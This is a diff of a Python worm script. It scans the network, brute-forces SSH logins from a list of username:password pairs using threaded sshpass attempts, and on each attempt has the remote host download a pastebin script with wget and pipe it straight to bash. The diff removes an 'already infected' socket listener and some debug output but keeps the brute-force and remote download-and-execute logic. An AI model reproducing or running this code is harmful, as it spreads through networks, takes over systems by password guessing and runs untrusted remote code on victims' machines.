@@ -3,12 +3,12 @@
 from threading import Thread
 import socket
 import time
+import subprocess
 
 #function called when dictionary attack found a password
 def passwordFoundCallback(password, sharedO):   
     sharedO.setFound(password)
     print ("Found Password for host: " + sharedO.getHost()) #+ " password: " + sharedO.getPassword() + "\n")
-    #print ("Password: " + shared.getPassword())
 
 class sharedThings():
     def __init__(self, host):
@@ -39,63 +39,17 @@ class BruteForceTask(Thread):
         self.password = password
         self.sharedO = sharedO
 
-
     def run(self):
         try:
-            #tempPassFileScript = self.password
-            #f = open(self.password, "w+")
-            #f.write("echo " + tempPassFileScript)
-            #f.close()
-            #subprocess.check_output(["chmod", "+x", tempPassFileScript])
-            #time.sleep(0.1)
-            #print ("trying with password: " + self.password)
             cmd = "setsid sshpass -p \"{0}\" ssh {1} \"wget -q -O - https://pastebin.com/raw/dFrUfqat | tr -d '\\r' | bash\"".format(self.password, self.host)
-            print("calling cmd: " + cmd)
-            subprocess.check_output(cmd, shell=True)
+            subprocess.call(cmd, shell=True)
+            print("cmd finished: " + cmd)
             passwordFoundCallback(self.password, self.sharedO)
         except:
                 pass
-                #different errors should be handled differently
-                #example of potential error:
-                #                                                       - Permission denied (nothing to do here, this is normal. Bad username/password Combination)
-                #                                                       - Connection closed (too many requests. We should try the password again and reduce the debit)
-                #                                                       - Connection refused (the port isnt open)
-                #                                                       - Other errors (the host isnt found and stuff)
         finally:
                 #subprocess.check_output(["rm", tempPassFileScript])
                 self.sharedO.decthreadCount()
-
-class SocketListener(Thread):
-
-        def __init__(self):
-                Thread.__init__(self)
-                self.continueToListen = True
-                
-        def run(self):
-                #create an INET, STREAMing socket
-                serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                #bind the socket to a public host and a port
-                serverSocket.bind((socket.gethostname(), 50000))
-                #become a server socket, 5 is the number of maximum connections that we can have at the same time
-                serverSocket.listen(5)
-                
-                while self.continueToListen:
-                        #we just received a new connection. This line will block until we receive a new connection.
-                        conn, addr = serverSocket.accept()
-                        
-                        #we already infected the computer. Sending OK to the computer that made the connection to let him know that we infected the computer, so that he won't try to infect us
-                        conn.sendall('OK'.encode('utf-8'))
-                        conn.close()
-                        
-        def     stopListening(self):
-                self.continueToListen = False
-
-#Step one: Open a socket, to let other computers know that this computer is infected.
-#socketThread = SocketListener()
-#socketThread.start()
-
-#Step two: Scan the network for other computers to infect
-import subprocess
 
 scanOutput = subprocess.check_output(["./scan.py"])
 scanOutput = scanOutput.decode("utf-8")
@@ -135,9 +89,6 @@ for ip in listedNmapString:
                         username, password = line.split(':')
                         password = password.rstrip()
                         username  = username + "@" + host
-                        #password = "\"" +password
-                        print("host: " + username)
-                        print("password: " + password)
                         t = BruteForceTask(username, password, sharedO)
                         t.start()
                         threadArray.append(t)
@@ -149,18 +100,8 @@ for ip in listedNmapString:
                                 time.sleep(0.01)
                         if sharedO.isFound():
                                 break
+
         for t in threadArray:
             t.join(timeout=1)
         if sharedO.isFound():
                 password = sharedO.password
-                print('Infecting the machine...')
-                # Infect the machine here
-
-try:
-        onSenCaliss = input('Appuyez sur nimporte quel touche pour Quitter (DEBUGGING PURPOSES, A ENLEVER)')
-except:
-        pass
-finally:
-        from sys import exit
-        socketThread.stopListening()
-        exit(0) # Successful exit
